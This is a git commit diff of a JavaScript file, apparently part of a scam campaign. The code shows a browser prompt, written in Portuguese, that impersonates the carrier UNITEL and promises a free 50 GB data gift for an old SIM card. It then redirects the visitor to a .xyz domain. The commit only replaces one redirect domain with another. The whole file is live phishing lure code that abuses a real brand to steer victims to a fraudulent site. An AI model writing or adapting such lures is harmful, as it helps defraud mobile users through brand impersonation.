2c3d9c8bfb6f0ae08106f25f2c330f5740abfafb
etietopa <etietopa111@gmail.com>
2025-02-19 16:20:44 +0100

    Update unitelsms.js

--- unitelsms.js
+++ unitelsms.js
@@ -2,5 +2,5 @@
 var password = 'REIVINDIQUE 50GB'
 password=prompt('UNITEL: Parabéns, tem direito à oferta de dados de 50 GB para um SIM ANTIGO. Clique em OK para reivindicar o presente de dados.','REIVINDIQUE 50GB');
 if (password != 'REIVINDIQUE 50GB') {
-location.href='https://www.year-25-gifts.xyz/unitel50gb';
+location.href='https://www.unitel50gb.xyz/obter-oferta';
 }
